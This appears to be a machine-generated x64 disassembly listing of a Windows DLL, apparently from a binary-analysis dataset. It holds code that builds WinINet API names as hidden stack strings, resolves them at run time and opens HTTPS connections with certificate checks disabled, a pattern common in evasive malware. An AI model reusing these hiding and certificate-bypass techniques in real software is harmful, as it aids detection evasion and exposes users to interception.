mov [ rbp + 0x78 ] 0xfffffffffffffffe
mov [ rsp + 0x340 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1e8 ] rax
mov r15 rdx
mov r12 rcx
mov [ rbp + 0x70 ] rdx
mov rax [ rdx ]
test rax rax
je r-xdata
mov rbx [ rdx + 0x8 ]
test rbx rbx
je r-xdata
cmp [ rax + 0x8 ] 0x4
jb r-xdata
xor al al
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
call sub_180014270
test al al
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ r15 ]
mov rcx [ rax ]
or rsi 0xffffffffffffffff
test rcx rcx
je r-xdata
mov dl 0x1
mov rcx r12
call sub_180015ef0
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov r8 rsi
mov rax [ rw-data ]
mov r8 [ rcx + rax ]
jmp r-xdata
mov [ rbp + 0x170 ] 0x65746e49
mov [ rbp + 0x174 ] 0x74656e72
mov [ rbp + 0x178 ] 0x63617243
mov [ rbp + 0x17c ] 0x6c72556b
mov [ rbp + 0x180 ] 0x57
lea rdx [ rbp + 0x170 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
lea rcx [ rbp + 0x120 ]
call [ LoadLibraryA@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov rcx [ r12 + 0xc8 ]
mov rax [ rcx ]
lea rdx [ rbp + 0xa8 ]
call [ rax + 0x10 ]
nop
xor edx edx
lea r8d [ rdx + 0x60 ]
lea rcx [ rbp - 0x58 ]
call sub_18001c9f0
mov [ rbp - 0x60 ] 0x68
mov [ rbp - 0x40 ] 0x1
mov [ rbp - 0x30 ] 0x1
mov [ rbp - 0x20 ] 0x1
mov [ rbp - 0x10 ] 0x1
mov [ rbp + 0x120 ] 0x696e6977
mov [ rbp + 0x124 ] 0x2e74656e
mov [ rbp + 0x128 ] 0x6c6c64
lea rcx [ rbp + 0x120 ]
call [ GetModuleHandleA@IAT ]
mov rbx rax
test rax rax
jne r-xdata
lea rdi [ r12 + 0x10 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
cmp [ rbp + 0xc0 ] 0x10
jb r-xdata
cmp [ rbp + 0xc0 ] 0x10
jb r-xdata
mov rcx rdi
mov rcx [ rdi ]
jmp r-xdata
mov [ rbp + 0xc0 ] 0xf
xor edi edi
mov [ rbp + 0xb8 ] rdi
mov [ rbp + 0xa8 ] dil
mov rcx r15
call sub_180009660
jmp r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
mov [ rbp + 0xc0 ] 0xf
xor edi edi
mov [ rbp + 0xb8 ] rdi
mov [ rbp + 0xa8 ] dil
mov rcx r15
call sub_180009660
jmp r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
xor edi edi
mov [ rsp + 0x44 ] edi
mov rax [ r15 ]
mov rcx [ r12 + 0xc8 ]
mov r10 [ rcx ]
lea r9 [ rsp + 0x44 ]
mov r8d [ rax + 0x8 ]
mov rdx [ rax ]
call [ r10 + 0x18 ]
mov r13 rax
mov [ rsp + 0x60 ] rax
test rax rax
jne r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
lea r9 [ rbp - 0x60 ]
xor r8d r8d
mov edx [ r12 + 0x20 ]
call rax
cmp [ rbp - 0x4c ] 0x0
jne r-xdata
mov [ rbp + 0x1d0 ] 0x65746e49
mov [ rbp + 0x1d4 ] 0x74656e72
mov [ rbp + 0x1d8 ] 0x72657551
mov [ rbp + 0x1dc ] 0x74704f79
mov [ rbp + 0x1e0 ] 0x576e6f69
mov [ rbp + 0x1e4 ] dil
lea rdx [ rbp + 0x1d0 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x78 ] rax
mov [ rbp + 0x188 ] 0x65746e49
mov [ rbp + 0x18c ] 0x74656e72
mov [ rbp + 0x190 ] 0x4f746553
mov [ rbp + 0x194 ] 0x6f697470
mov [ rbp + 0x198 ] 0x576e
mov [ rbp + 0x19a ] dil
lea rdx [ rbp + 0x188 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x68 ] rax
mov [ rbp + 0x1b8 ] 0x65746e49
mov [ rbp + 0x1bc ] 0x74656e72
mov [ rbp + 0x1c0 ] 0x736f6c43
mov [ rbp + 0x1c4 ] 0x6e614865
mov [ rbp + 0x1c8 ] 0x656c64
lea rdx [ rbp + 0x1b8 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov r14 rax
mov [ rsp + 0x50 ] rax
mov [ rbp + 0x130 ] 0x65746e49
mov [ rbp + 0x134 ] 0x74656e72
mov [ rbp + 0x138 ] 0x6e65704f
mov [ rbp + 0x13c ] 0x57
lea rdx [ rbp + 0x130 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x70 ] rax
mov [ rbp + 0x158 ] 0x65746e49
mov [ rbp + 0x15c ] 0x74656e72
mov [ rbp + 0x160 ] 0x6e6e6f43
mov [ rbp + 0x164 ] 0x57746365
mov [ rbp + 0x168 ] dil
lea rdx [ rbp + 0x158 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rbp - 0x78 ] rax
mov [ rbp + 0x140 ] 0x70747448
mov [ rbp + 0x144 ] 0x6e65704f
mov [ rbp + 0x148 ] 0x75716552
mov [ rbp + 0x14c ] 0x41747365
mov [ rbp + 0x150 ] dil
lea rdx [ rbp + 0x140 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rbp - 0x80 ] rax
mov [ rbp + 0x1a0 ] 0x70747448
mov [ rbp + 0x1a4 ] 0x646e6553
mov [ rbp + 0x1a8 ] 0x75716552
mov [ rbp + 0x1ac ] 0x45747365
mov [ rbp + 0x1b0 ] 0x5778
mov [ rbp + 0x1b2 ] dil
lea rdx [ rbp + 0x1a0 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rbp - 0x70 ] rax
cmp [ rsp + 0x78 ] rdi
je r-xdata
cmp [ rbp + 0xc0 ] 0x10
jb r-xdata
mov [ rbp - 0x48 ] rdi
mov rax [ rdi ]
mov [ rbp - 0x48 ] rax
jmp r-xdata
mov rcx r13
call sub_18001c80c
nop
cmp [ rbp + 0xc0 ] 0x10
jb r-xdata
cmp [ rsp + 0x68 ] rdi
je r-xdata
mov [ rbp + 0xc0 ] 0xf
mov [ rbp + 0xb8 ] rdi
mov [ rbp + 0xa8 ] 0x0
mov rcx r15
call sub_180009660
jmp r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
mov rax [ r12 + 0x20 ]
mov [ rbp - 0x40 ] eax
mov [ rbp - 0x4c ] 0x4
mov eax 0x1bb
mov [ rbp - 0x3c ] ax
mov [ rbp + 0xc0 ] 0xf
mov [ rbp + 0xb8 ] rdi
mov [ rbp + 0xa8 ] 0x0
mov rcx r15
call sub_180009660
jmp r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
test r14 r14
je r-xdata
mov r10 [ rsp + 0x70 ]
test r10 r10
je r-xdata
cmp [ rbp - 0x78 ] rdi
je r-xdata
cmp [ rbp - 0x80 ] rdi
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x48 ] edi
cmp [ rw-data ] edi
jbe r-xdata
xor bl bl
mov rbx r14
mov [ rbp + 0xc0 ] 0xf
mov [ rbp + 0xb8 ] rdi
mov [ rbp + 0xa8 ] 0x0
mov rcx r15
call sub_180009660
movzx eax bl
jmp r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
mov r8 rdi
lea r8 [ r12 + 0x48 ]
cmp [ r8 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e8 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x340 ]
add rsp 0x2f0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov ecx [ rsp + 0x48 ]
inc ecx
mov [ rsp + 0x48 ] ecx
cmp ecx [ rw-data ]
jae r-xdata
mov r8d [ rbp - 0x40 ]
mov [ rbp + 0xe8 ] 0x7
mov [ rbp + 0xe0 ] rdi
mov [ rbp + 0xd0 ] di
mov rdx [ rbp - 0x48 ]
lea rcx [ rbp + 0xd0 ]
call sub_180003b50
nop
lea rdx [ rbp + 0xd0 ]
cmp [ rbp + 0xe8 ] 0x8
cmovae rdx [ rbp + 0xd0 ]
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] edi
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x20 ] rdi
xor r9d r9d
movzx r8d [ rbp - 0x3c ]
mov rcx r14
call [ rbp - 0x78 ]
mov r13 rax
cmp [ rbp + 0xe8 ] 0x8
jb r-xdata
neg al
sbb edx edx
and edx 0x3
mov [ rsp + 0x20 ] edi
xor r9d r9d
lea rcx [ r--data ]
call r10
mov r14 rax
test rax rax
je r-xdata
mov r8 [ r8 ]
jmp r-xdata
mov r10 [ rsp + 0x70 ]
jmp r-xdata
mov [ rbp + 0xe8 ] 0x7
mov [ rbp + 0xe0 ] rdi
mov [ rbp + 0xd0 ] di
test r13 r13
jne r-xdata
mov rcx [ rbp + 0xd0 ]
call j_sub_18001c80c
movzx eax [ r12 + 0x40 ]
test al al
je r-xdata
cmp [ r12 + 0x40 ] 0x0
je r-xdata
mov rcx r14
call rbx
jmp r-xdata
mov esi 0x4480000
cmp [ rbp - 0x4c ] 0x4
mov eax 0x4c80000
cmove esi eax
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
lea rax [ rbp + 0x48 ]
mov [ rsp + 0x58 ] rax
mov [ rbp + 0x60 ] 0x7
mov [ rbp + 0x58 ] rdi
mov [ rbp + 0x48 ] di
lea rdx [ r12 + 0x98 ]
mov r9 rsi
xor r8d r8d
lea rcx [ rbp + 0x48 ]
call sub_180001ac0
nop
lea rdx [ r12 + 0x70 ]
lea rcx [ rbp + 0x80 ]
call sub_1800020a0
nop
lea r9 [ rbp + 0x48 ]
mov r8 rax
mov rdx r13
mov rcx r12
call sub_180014d00
test al al
je r-xdata
mov rbx rdi
mov rcx rax
call sub_180008850
mov rbx rax
jmp r-xdata
mov rcx r14
call rbx
mov rcx r13
call rbx
nop
cmp [ rbp + 0xc0 ] 0x10
jb r-xdata
lea r8 [ rbp + 0xa8 ]
cmp [ rbp + 0xc0 ] 0x10
cmovae r8 [ rbp + 0xa8 ]
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] esi
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] rdi
mov r9 rax
lea rdx [ r--data ]
mov rcx r13
call [ rbp - 0x80 ]
mov rsi rax
cmp [ rbp + 0x110 ] 0x10
jb r-xdata
mov rax [ rax ]
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088d0
mov r8d 0x9
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rbp + 0xf8 ]
mov rcx rbx
call sub_180009450
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov [ rbp + 0xc0 ] 0xf
mov [ rbp + 0xb8 ] rdi
mov [ rbp + 0xa8 ] 0x0
mov rcx r15
call sub_180009660
jmp r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
mov [ rbp + 0x110 ] 0xf
mov [ rbp + 0x108 ] rdi
mov [ rbp + 0xf8 ] 0x0
test rbx rbx
je r-xdata
mov rcx [ rbp + 0xf8 ]
call j_sub_18001c80c
test rsi rsi
jne r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
mov rcx [ r12 + 0xc8 ]
mov rax [ rcx ]
mov rdx rsi
call [ rax + 0x8 ]
cmp [ rbp - 0x4c ] 0x4
jne r-xdata
mov rcx r14
mov rbx [ rsp + 0x50 ]
call rbx
mov rcx r13
call rbx
jmp r-xdata
mov [ rbp + 0x10 ] 0x38
mov [ rbp + 0x18 ] rdi
mov [ rbp + 0x20 ] rdi
mov [ rbp + 0x28 ] rdi
mov rax [ rsp + 0x60 ]
mov [ rbp + 0x30 ] rax
mov eax [ rsp + 0x44 ]
mov [ rbp + 0x38 ] eax
mov [ rbp + 0x3c ] eax
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
lea rdx [ rbp + 0x10 ]
mov rcx rsi
call [ rbp - 0x70 ]
mov ebx eax
mov ecx 0x1f4
call [ Sleep@IAT ]
mov rcx r14
mov r14 [ rsp + 0x50 ]
call r14
mov rcx r13
call r14
mov rcx rsi
call r14
test ebx ebx
jne r-xdata
mov [ rsp + 0x40 ] edi
mov [ rsp + 0x58 ] 0x4
lea r9 [ rsp + 0x58 ]
lea r8 [ rsp + 0x40 ]
mov edx 0x1f
mov rcx rsi
call [ rsp + 0x78 ]
test eax eax
je r-xdata
or rsi 0xffffffffffffffff
mov bl 0x1
jmp r-xdata
mov ecx 0xbb8
call [ Sleep@IAT ]
mov rbx r14
or [ rsp + 0x40 ] 0x3100
mov r9d [ rsp + 0x58 ]
lea r8 [ rsp + 0x40 ]
mov edx 0x1f
mov rcx rsi
call [ rsp + 0x68 ]
mov rcx [ rsp + 0x60 ]
call sub_18001c80c
nop
cmp [ rbp + 0xc0 ] 0x10
jb r-xdata
sub_180016a70
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180009d20
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
mov rdx rdi
call sub_180003f60
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180009d20
jmp r-xdata
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
call sub_180003f60
nop
sub_180016b60
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] rsi
mov rdi rdx
mov rbx rcx
mov rax 0x333333333333333
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rbx ]
mov r13 0x6666666666666667
mov rax r13
imul rcx
sar rdx 0x5
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rdi
retn
mov rdx rdi
lea rcx [ rbx + 0x18 ]
call sub_1800140a0
mov rsi rax
mov [ rsp + 0x68 ] rax
movzx eax [ rsp + 0x68 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] 0x0
lea r9 [ rbx + 0x18 ]
mov r8 rsi
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
call sub_1800158f0
nop
mov r11 [ rbx + 0x8 ]
mov r10 [ rbx ]
mov rcx r11
sub rcx r10
mov rax r13
imul rcx
mov r13 rdx
sar r13 0x5
mov rax r13
shr rax 0x3f
add r13 rax
test r10 r10
je r-xdata
lea rax [ rdi + rdi * 4 ]
shl rax 0x4
add rax rsi
mov [ rbx + 0x10 ] rax
lea rax [ r13 + r13 * 4 ]
shl rax 0x4
add rax rsi
mov [ rbx + 0x8 ] rax
mov [ rbx ] rsi
movzx r9d [ rsp + 0x68 ]
lea r8 [ rbx + 0x18 ]
mov rdx r11
mov rcx r10
call sub_180015870
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180016c90
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi [ rcx ]
mov r10 [ rcx + 0x8 ]
mov r11 rdx
mov r9 [ rsi ]
mov r8 [ rsi + 0x8 ]
mov rbx 0x6666666666666667
sub r8 r9
mov rax rbx
mov rdi rcx
imul r8
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
jne r-xdata
mov rax rbx
mov rcx r10
sub rcx r9
imul rcx
mov rbx rdx
sar rbx 0x4
mov rax rbx
shr rax 0x3f
add rbx rax
xor ebx ebx
jmp r-xdata
mov r9 r11
mov r8d 0x1
mov rdx r10
mov rcx rsi
call sub_180015990
mov rax [ rsi ]
mov rsi [ rsp + 0x38 ]
lea rcx [ rbx + rbx * 4 ]
mov rbx [ rsp + 0x30 ]
lea rcx [ rax + rcx * 8 ]
mov rax rdi
mov [ rdi + 0x8 ] rcx
add [ rdi + 0x8 ] 0x28
add rsp 0x20
pop rdi
retn
sub_180016d40
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
movzx r9d [ rsp + 0x30 ]
mov rdx [ rbx + 0x8 ]
lea r8 [ rbx + 0x18 ]
call sub_180015870
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180016d80
push rdi
sub rsp 0x20
mov r8 [ rcx + 0x8 ]
mov r11 rdx
mov rdi 0x6666666666666667
sub r8 [ rcx ]
mov rax rdi
mov r9 0x333333333333333
mov r10 rcx
imul r8
mov r8 rdx
sar r8 0x5
mov rax r8
shr rax 0x3f
add r8 rax
mov rax r9
sub rax r11
cmp rax r8
jae r-xdata
mov rcx [ rcx + 0x10 ]
mov rax rdi
add r8 r11
sub rcx [ r10 ]
imul rcx
sar rdx 0x5
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
add rsp 0x20
pop rdi
retn
mov rax rdx
shr rax 0x1
sub r9 rax
cmp r9 rdx
jae r-xdata
add rdx rax
xor edx edx
jmp r-xdata
cmp rdx r8
mov rcx r10
cmovb rdx r8
call sub_180016b60
sub_180016e30
mov [ rsp + 0x18 ] rbx
push rsi
push rdi
push r12
sub rsp 0x50
mov rdi r9
mov rsi r8
mov rbx rdx
mov r12 rcx
cmp rdx r8
je r-xdata
mov rax [ rdi ]
mov rbx [ rsp + 0x80 ]
mov [ r12 ] rax
mov rax [ rdi + 0x8 ]
mov [ r12 + 0x8 ] rax
mov rax r12
add rsp 0x50
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x70 ] rbp
mov [ rsp + 0x78 ] r13
xor r13d r13d
nop
test bpl bpl
je r-xdata
mov rcx [ rsp + 0x20 ]
call j_sub_18001c80c
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_180016c90
lea rcx [ rsp + 0x20 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x20 ] r13w
call sub_180001ac0
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov r9d 0x8
xor r8d r8d
call sub_180013f90
test rax rax
sete bpl
cmp [ rsp + 0x38 ] 0x8
jb r-xdata
mov r13 [ rsp + 0x78 ]
mov rbp [ rsp + 0x70 ]
sub_180016f10
mov [ rsp + 0x18 ] rbx
push rsi
push rdi
push r12
sub rsp 0x50
mov rdi r9
mov rsi r8
mov rbx rdx
mov r12 rcx
cmp rdx r8
je r-xdata
mov rax [ rdi ]
mov rbx [ rsp + 0x80 ]
mov [ r12 ] rax
mov rax [ rdi + 0x8 ]
mov [ r12 + 0x8 ] rax
mov rax r12
add rsp 0x50
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x70 ] rbp
mov [ rsp + 0x78 ] r13
xor r13d r13d
nop
test bpl bpl
je r-xdata
mov rcx [ rsp + 0x20 ]
call j_sub_18001c80c
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_180016c90
lea rcx [ rsp + 0x20 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x20 ] r13w
call sub_180001ac0
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov r9d 0x7
xor r8d r8d
call sub_180013f90
test rax rax
sete bpl
cmp [ rsp + 0x38 ] 0x8
jb r-xdata
mov r13 [ rsp + 0x78 ]
mov rbp [ rsp + 0x70 ]
sub_180016ff0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180016d80
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x5
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x50
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rdx rdi
call sub_180015140
nop
lea rdx [ rdi + rdi * 4 ]
shl rdx 0x4
add rdx [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180016d80
jmp r-xdata
call sub_180015140
nop
sub_1800170c0
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x90
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0xd8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
mov rbx r8
mov r13 rdx
mov r12 rcx
mov [ rsp + 0x28 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
nop [ rax ] eax
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
cmp rdi 0xffffffffffffffff
je r-xdata
mov rsi rax
sub rsi rdi
mov r9 rsi
mov r8 rdi
lea rdx [ rsp + 0x38 ]
mov rcx r13
call sub_180014c20
nop
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov r9 [ rbx + 0x10 ]
mov r8 rdi
mov rcx r13
call sub_180013f90
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
mov rax r12
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xd8 ]
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
or r9 0xffffffffffffffff
mov r8 rdi
lea rdx [ rsp + 0x38 ]
mov rcx r13
call sub_180014c20
nop
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rdi [ rbx + 0x10 ]
add rdi rbp
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov r9 rsi
mov r8 rdi
lea rdx [ rsp + 0x60 ]
mov rcx r13
call sub_180014c20
nop
mov rdx rax
mov rcx r12
call sub_180016a70
nop
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
or r9 0xffffffffffffffff
mov r8 rdi
lea rdx [ rsp + 0x60 ]
mov rcx r13
call sub_180014c20
nop
mov rdx rax
mov rcx r12
call sub_180016a70
nop
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
jmp r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
nop
sub_180017260
push rbp
push rbx
push rsi
push rdi
push r12
lea rbp [ rsp - 0x190 ]
sub rsp 0x290
mov [ rbp - 0x40 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x188 ] rax
movzx esi r9b
mov rdi r8
mov rbx rdx
xor r12d r12d
mov [ rsp + 0x48 ] r12d
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x38 ] r12
xor edx edx
lea r8d [ r12 + 0x60 ]
lea rcx [ rsp + 0x58 ]
call sub_18001c9f0
mov [ rsp + 0x50 ] 0x68
mov [ rsp + 0x70 ] 0x1
mov [ rbp - 0x80 ] 0x1
mov [ rbp - 0x70 ] 0x1
mov [ rbp - 0x60 ] 0x1
mov [ rbp + 0x160 ] 0x696e6977
mov [ rbp + 0x164 ] 0x2e74656e
mov [ rbp + 0x168 ] 0x6c6c64
lea rcx [ rbp + 0x160 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov [ rbp + 0x170 ] 0x65746e49
mov [ rbp + 0x174 ] 0x74656e72
mov [ rbp + 0x178 ] 0x63617243
mov [ rbp + 0x17c ] 0x6c72556b
mov [ rbp + 0x180 ] 0x57
lea rdx [ rbp + 0x170 ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
lea rcx [ rbp + 0x160 ]
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
mov rcx [ rdi + 0x10 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
xor r8d r8d
lea rdx [ r--data ]
mov rcx rbx
call sub_180003b50
nop
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
xor r8d r8d
lea rdx [ r--data ]
mov rcx rbx
call sub_180003b50
nop
jmp r-xdata
lea r9 [ rsp + 0x50 ]
xor r8d r8d
mov edx ecx
mov rcx rdi
call rax
mov ecx [ rsp + 0x64 ]
cmp ecx 0x3
je r-xdata
mov rdi [ rdi ]
mov rax rbx
mov rcx [ rbp + 0x188 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x290
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
lea rax [ rw-data ]
lea rdx [ rw-data ]
cmp ecx 0x3
cmove rdx rax
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r12
mov [ rbp - 0x38 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x38 ]
call sub_180003b50
nop
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r12
mov [ rbp - 0x10 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rw-data ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rw-data ]
lea rcx [ rbp - 0x10 ]
call sub_180003b50
nop
lea r8 [ rbp - 0x38 ]
lea rdx [ rbp - 0x10 ]
lea rcx [ rbp + 0x40 ]
call sub_180015750
nop
mov rdx rax
lea rcx [ rsp + 0x28 ]
call sub_180016ff0
nop
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
cmp ecx 0x4
je r-xdata
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] r12
mov [ rbp + 0x68 ] r12w
cmp [ rbp + 0x58 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
xor r8d r8d
lea rdx [ r--data ]
mov rcx rbx
call sub_180003b50
nop
jmp r-xdata
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] r12
mov [ rbp + 0x40 ] r12w
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x40 ]
call j_sub_18001c80c
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r12
mov [ rbp - 0x10 ] r12w
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_18001c80c
lea rax [ rw-data ]
lea rdx [ rw-data ]
test sil sil
cmovne rdx rax
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r12
mov [ rbp - 0x38 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x38 ]
call sub_180003b50
nop
mov r8d [ rsp + 0x70 ]
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r12
